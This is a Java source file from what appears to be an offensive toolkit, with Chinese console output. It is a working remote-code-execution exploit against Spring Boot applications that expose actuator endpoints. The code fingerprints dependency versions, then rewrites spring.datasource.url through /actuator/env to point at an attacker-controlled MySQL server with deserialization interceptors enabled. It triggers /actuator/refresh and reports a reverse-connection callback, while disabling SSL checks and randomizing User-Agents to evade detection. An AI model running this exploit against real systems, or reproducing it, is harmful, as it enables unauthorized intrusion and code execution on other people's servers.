package src.main.module;

import src.main.common.UA_Config;
import src.main.impl.ResultCallback;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;
import java.util.Objects;
import java.util.Scanner;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import static src.main.SSLVerify.sslVer.disableSSLVerification;

public class MysqlJDBCRCE {
    private String address;
    private String vpsIP;
    private String vpsPORT;
    private String suvalue;
    private String suorigin;
    public String text;
    public String expdata1 = "spring.datasource.url=%s";
    public String expdata2 = "{\"name\":\"spring.datasource.url\",\"value\":\"%s\"}";
    public String mysql5tmp = "jdbc:mysql://%s:%s/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
    public String mysql8tmp = "jdbc:mysql://%s:%s/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true";
    public MysqlJDBCRCE(String address, String vpsIP, String vpsPORT){
        this.address = address;
        this.vpsIP = vpsIP;
        this.vpsPORT = vpsPORT;
    }

    public void Result1( ){

    }

    public void Result2(){
        String llib = "spring-boot-starter-actuator";
        String api = "/actuator/env";
        String refapi = "/actuator/refresh";
        String llib1 = "mysql-connector-java";
        String site = address + api;
        String refite = address + refapi;
        String ua = "";
        String data = "";
        disableSSLVerification();
        try {
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            conn.setDoOutput(true);
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            String inputLine;
            StringBuilder response = new StringBuilder();
            while ((inputLine = in.readLine()) != null) {
                response.append(inputLine);
            }
            in.close();
            if (responseCode == HttpURLConnection.HTTP_OK && ((response.toString().contains(llib)) && (response.toString().contains(llib1)))) {
                String regex = llib + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(response.toString());
                String regex1 = llib1 + "-(\\d+\\.\\d+\\.\\d+)";
                Pattern pattern1 = Pattern.compile(regex1);
                Matcher matcher1 = pattern1.matcher(response.toString());
                if (matcher.find() && matcher1.find()) {
                    text = String.format("spring-boot-starter-actuator 依赖为: %s", matcher.group(1));
                    System.out.println(text);
//                    callback.onResult(text);
                    text = String.format("mysql-connector-java 依赖为: %s", matcher1.group(1));
                    System.out.println(text);
                    if (response.toString().contains("commons-collections")||response.toString().contains("Jdk7u21")||response.toString().contains("Jdk8u20")){
                        System.out.println("发现gadget有可能为:commons-collections、Jdk7u21、Jdk8u20" + "\n" + "请审查确认gadget后再使用ysoserial工具");
                    }
                    if (response.toString().contains("spring.datasource.url")){
                        String regex3 = "\"spring.datasource.url\"\\s*:\\s*\\{[^}]*\\}";
                        Pattern pattern3 = Pattern.compile(regex3);
                        Matcher matcher3 = pattern3.matcher(response.toString());
                        if (matcher3.find()){
                            text = "当前值为: " + matcher3.group();
                            System.out.println(text);
                        }
                    }
                    String mysqlVersion = matcher1.group(1).split("\\.")[0];
                    if (mysqlVersion.equals("8")){
                        String mysql8 = String.format(mysql8tmp,vpsIP,vpsPORT);
                        data = String.format(expdata2,mysql8);
                    }else if (mysqlVersion.equals("5")){
                        String mysql5 = String.format(mysql5tmp,vpsIP,vpsPORT);
                        data = String.format(expdata2,mysql5);
                    }else {
                        text = "未知mysql版本";
                    }
                    try {
                        URL obj1 = new URL(site);
                        HttpURLConnection conn1 = (HttpURLConnection) obj1.openConnection();
                        ua = uacf.getRandomUserAgent(ualist);
                        conn1.setRequestProperty("User-Agent", ua);
                        conn1.setRequestProperty("Content-Type", "application/json");
                        conn1.setRequestMethod("POST");
                        conn1.setDoOutput(true);
                        try (OutputStream os = conn1.getOutputStream()) {
                            byte[] input = data.getBytes(StandardCharsets.UTF_8);
                            os.write(input, 0, input.length);
                        }
                        int responseCode1 = conn1.getResponseCode();
                        if (responseCode1 == HttpURLConnection.HTTP_OK) {
                            try {
                                URL obj2 = new URL(refite);
                                HttpURLConnection conn2 = (HttpURLConnection) obj2.openConnection();
                                ua = uacf.getRandomUserAgent(ualist);
                                conn2.setRequestProperty("User-Agent", ua);
                                conn2.setRequestProperty("Content-Type", "application/json");
                                conn2.setRequestMethod("POST");
                                conn2.setDoOutput(true);
                                int responseCode2 = conn2.getResponseCode();
                                if (responseCode2 == HttpURLConnection.HTTP_OK) {
                                    text = "执行命令成功,请访问一个带有SQL请求的接口，并在反弹服务器上查看";
                                    System.out.println(text);
//                                    callback.onResult(text);
                                    text = "当前反弹vpsIP: " + vpsIP + "vpsPort: 7777";
                                    System.out.println(text);
//                                    callback.onResult(text);
                                } else {
                                    text = "发送请求失败，请重试";
                                    System.out.println(text);
//                                    callback.onResult(text);
                                }
                            } catch (Exception e) {
                                text = "异常：发起refresh请求失败";
                                System.out.println(text);
//                                callback.onResult(text);
                                e.printStackTrace();
                            }
                        }
                    } catch (Exception e) {
                        text = "异常: 发起env请求失败";
                        System.out.println(text);
//                        callback.onResult(text);
                        e.printStackTrace();
                    }
                }else {
                    text = "未找到依赖项！";
                    System.out.println(text);
//                    callback.onResult(text);
                }
            }
        }catch (Exception e) {
            text = "检测依赖异常";
//            callback.onResult(text);
            System.out.println(text);
            e.printStackTrace();
        }
    }

    public void Exp(){
        String api = "/actuator/env";
        String site = address + api;
        String ua = "";
        disableSSLVerification();
        try{
            URL obj = new URL(site);
            HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
            UA_Config uacf = new UA_Config();
            List<String> ualist = uacf.loadUserAgents();
            ua = uacf.getRandomUserAgent(ualist);
            conn.setRequestProperty("User-Agent",ua);
            conn.setRequestMethod("GET");
            int responseCode = conn.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                text = "当前版本为springboot2";
//                callback.onResult(text);
//                Result2(callback);
                System.out.println(text);
                Result2();
            }else if (responseCode == HttpURLConnection.HTTP_NOT_FOUND){
                text = "当前版本为springboot1";
//                callback.onResult("当前版本为springboot1");
//                Result1(callback);
                System.out.println(text);
                Result1();
            }else{
                text = "未识别springboot版本";
                System.out.println(text);
//                callback.onResult(text);
            }
        }catch (Exception e){
            text = "检测springboot版本异常";
            System.out.println(text);
//            callback.onResult(text);
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        MysqlJDBCRCE m = new MysqlJDBCRCE("http://127.0.0.1:9097/","127.0.0.1","3307");
        m.Exp();
    }
}
